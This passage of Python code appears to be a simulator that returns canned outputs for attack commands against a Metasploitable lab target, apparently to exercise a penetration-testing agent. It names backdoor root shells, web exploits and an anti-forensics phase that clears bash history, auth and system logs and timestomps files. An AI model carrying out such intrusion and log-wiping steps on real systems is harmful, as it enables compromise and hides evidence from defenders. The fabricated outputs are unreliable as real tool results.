        return f"220 (vsFTPd 2.3.4)\n331 Please specify the password.\n[+] Backdoor triggered!\nConnected to {target} port 6200.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] vsftpd backdoor root shell"
    if "1524" in cmd_lower and ("telnet" in cmd_lower or "nc" in cmd_lower):
        return f"Trying {target}...\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot\n[+] Ingreslock root shell on port 1524"
    if "6667" in cmd_lower and ("nc" in cmd_lower or "ab;" in cmd_lower):
        return f":irc.TestIRC NOTICE AUTH :*** Looking up your hostname...\nuid=0(root) gid=0(root) groups=0(root)\n[+] UnrealIRCd backdoor — root RCE"

    # Fallback: try matching command keywords
    if "exploit" in cmd_lower or "meterpreter" in cmd_lower:
        return f"[*] Exploiting target {target}\n[+] Backdoor triggered\n[+] shell session 1 opened ({target}:6200 -> 10.10.14.2:8080)\nroot@metasploitable:/#"
    if "shell" in cmd_lower or "reverse" in cmd_lower:
        return f"[+] Reverse shell received\nroot@metasploitable:/# id\nuid=0(root) gid=0(root)"
    if "scan" in cmd_lower:
        return "\n".join([f"Discovered open port {p}/tcp on {target}" for p in MSF2_PORTS[:5]])
    if "enum" in cmd_lower:
        return f"[+] Enumerating {target}\n[+] Found users: msfadmin, user, service, postgres\n[+] Found shares: tmp, opt"
    
    # Phase 9: Web exploitation keyword fallbacks
    if "ssti" in cmd_lower or "template" in cmd_lower:
        return f"[+] SSTI detected on {target}\n[+] {{{{7*7}}}} → 49\nuid=33(www-data) gid=33(www-data)"
    if "lfi" in cmd_lower or "local_file" in cmd_lower or "file_include" in cmd_lower:
        return f"[+] LFI on {target}: /etc/passwd readable\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash"
    if "rfi" in cmd_lower or "remote_file" in cmd_lower:
        return f"[+] RFI on {target}: remote shell loaded\nuid=33(www-data) gid=33(www-data)"
    if "ssrf" in cmd_lower:
        return f"[+] SSRF on {target}: internal services discovered\n[+] Port 3306: MySQL\n[+] Port 6379: Redis"
    if "xxe" in cmd_lower or "xml_entity" in cmd_lower:
        return f"[+] XXE on {target}: /etc/passwd extracted\nroot:x:0:0:root:/root:/bin/bash"
    if "nosql" in cmd_lower:
        return f"[+] NoSQL injection bypass on {target}\n[+] Login as admin successful\ncredential: nosql_admin"
    if "inject" in cmd_lower and ("cmd" in cmd_lower or "command" in cmd_lower or "os" in cmd_lower):
        return f"[+] Command injection on {target}\nuid=33(www-data) gid=33(www-data)"
    if "upload" in cmd_lower and ("bypass" in cmd_lower or "shell" in cmd_lower or "php" in cmd_lower):
        return f"[+] File upload bypass on {target}\n[+] Web shell uploaded\nuid=33(www-data) gid=33(www-data)"
    if "deserializ" in cmd_lower:
        return f"[+] Deserialization exploit on {target}\nuid=0(root) gid=0(root)"
    if "jwt" in cmd_lower:
        return f"[+] JWT attack on {target}\n[+] Admin token forged\ncredential: jwt_admin"
    if "container" in cmd_lower and "escape" in cmd_lower:
        return f"[+] Container escape on {target}\nuid=0(root) gid=0(root) — host root shell"
    if "tunnel" in cmd_lower or "pivot" in cmd_lower or "proxy" in cmd_lower:
        return f"[+] Tunnel established to {target}\n[+] SOCKS5 proxy available at 127.0.0.1:9050"
    if "spray" in cmd_lower or "password_spray" in cmd_lower:
        return f"[+] Password spray on {target}\n[+] msfadmin:msfadmin [SUCCESS]\ncredential: msfadmin:msfadmin"
    
    # ─── CLOSEOUT phase commands ─────────────────────────────────
    if "remove_uploaded_tools" in cmd_lower or "cleanup_tmp" in cmd_lower:
        return (
            f"[CLOSEOUT] Scanning {target} for uploaded artifacts...\n"
            f"[CLOSEOUT] Removed /tmp/linpeas.sh\n"
            f"[CLOSEOUT] Removed /tmp/exploit.py\n"
            f"[CLOSEOUT] Removed /dev/shm/.payload\n"
            f"CLOSEOUT_TOOLS_REMOVED - 3 artifacts cleaned"
        )
    if "remove_ssh_keys" in cmd_lower:
        return (
            f"[CLOSEOUT] Checking authorized_keys on {target}...\n"
            f"[CLOSEOUT] Removed planted key from /root/.ssh/authorized_keys\n"
            f"[CLOSEOUT] Removed planted key from /home/msfadmin/.ssh/authorized_keys\n"
            f"CLOSEOUT_KEYS_REMOVED - 2 keys cleaned"
        )
    if "remove_cron" in cmd_lower:
        return (
            f"[CLOSEOUT] Checking crontabs on {target}...\n"
            f"[CLOSEOUT] Removed backdoor cron from root crontab\n"
            f"CLOSEOUT_CRON_REMOVED - 1 backdoor cron removed"
        )
    if "verify_target_stable" in cmd_lower:
        return (
            f"[CLOSEOUT] Verifying target {target} stability...\n"
            f"[CLOSEOUT] All services responding normally\n"
            f"[CLOSEOUT] No orphaned processes found\n"
            f"[CLOSEOUT] Disk usage nominal\n"
            f"CLOSEOUT_TARGET_STABLE - target verified healthy"
        )
    
    # ─── Anti-forensics CLOSEOUT commands (Phase 6.7) ────────────
    if "clear_bash_history" in cmd_lower or "history -c" in cmd_lower:
        return (
            f"[CLOSEOUT] Clearing bash history on {target}...\n"
            f"[CLOSEOUT] /root/.bash_history zeroed\n"
            f"[CLOSEOUT] /home/msfadmin/.bash_history zeroed\n"
            f"CLOSEOUT_HISTORY_CLEARED - command history wiped"
        )
    if "clear_auth_log" in cmd_lower:
        return (
            f"[CLOSEOUT] Clearing authentication logs on {target}...\n"
            f"[CLOSEOUT] /var/log/auth.log zeroed (was 2.4MB)\n"
            f"[CLOSEOUT] /var/log/secure not found (Debian-based)\n"
            f"CLOSEOUT_AUTH_CLEARED - auth evidence removed"
        )
    if "clear_wtmp" in cmd_lower or "clear_btmp" in cmd_lower:
        return (
            f"[CLOSEOUT] Clearing login records on {target}...\n"
            f"[CLOSEOUT] /var/log/wtmp zeroed (removed 847 login records)\n"
            f"[CLOSEOUT] /var/log/btmp zeroed (removed 12 failed attempts)\n"
            f"[CLOSEOUT] /var/log/lastlog zeroed\n"
            f"CLOSEOUT_LOGIN_LOGS_CLEARED - session records wiped"
        )
    if "shred" in cmd_lower and ("sensitive" in cmd_lower or "loot" in cmd_lower or "dump" in cmd_lower):
        return (
            f"[CLOSEOUT] Secure shredding files on {target}...\n"
            f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 1/3 (random)\n"
            f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 2/3 (random)\n"
            f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 3/3 (000000)\n"
            f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: removing\n"
            f"CLOSEOUT_FILES_SHREDDED - sensitive files securely destroyed"
        )
    if "timestomp" in cmd_lower or ("touch -r" in cmd_lower and "closeout" in cmd_lower):
        return (
            f"[CLOSEOUT] Timestomping modified files on {target}...\n"
            f"[CLOSEOUT] Reset timestamps on 7 files in /tmp\n"
            f"[CLOSEOUT] Reset timestamps on 3 files in /dev/shm\n"
            f"[CLOSEOUT] All file times now match /etc/hostname baseline\n"
            f"CLOSEOUT_TIMESTAMPS_FIXED - forensic timeline neutralized"
        )
    if "clear_syslog" in cmd_lower or ("syslog" in cmd_lower and "dev/null" in cmd_lower):
        return (
            f"[CLOSEOUT] Clearing system logs on {target}...\n"
            f"[CLOSEOUT] /var/log/syslog zeroed (was 5.1MB)\n"
            f"[CLOSEOUT] /var/log/messages zeroed\n"
            f"CLOSEOUT_SYSLOG_CLEARED - system log evidence removed"
        )
    if "known_hosts" in cmd_lower and ("remove" in cmd_lower or "rm" in cmd_lower):
        return (
            f"[CLOSEOUT] Removing SSH known_hosts on {target}...\n"
            f"[CLOSEOUT] Removed /root/.ssh/known_hosts (3 entries)\n"
            f"[CLOSEOUT] Removed /home/msfadmin/.ssh/known_hosts (1 entry)\n"
            f"CLOSEOUT_KNOWN_HOSTS_REMOVED - SSH connection evidence removed"
        )
    
    # Phase 6.9: generate_report — marks CLOSEOUT as complete
    if "generate_report" in cmd_lower or ("engagement report" in cmd_lower) or ("report_generated" in cmd_lower):
        return (
            f"=== ARIASKA ENGAGEMENT REPORT ===\n"
            f"Target: {target}\n"
            f"Status: CLOSEOUT COMPLETE\n"
            f"Artifacts removed: YES\n"
            f"Logs cleared: YES\n"
            f"Target stable: VERIFIED\n"
            f"Duration: engagement concluded normally\n"
            f"REPORT_GENERATED"
        )

    return f"[SIM] {command[:80]}... executed"

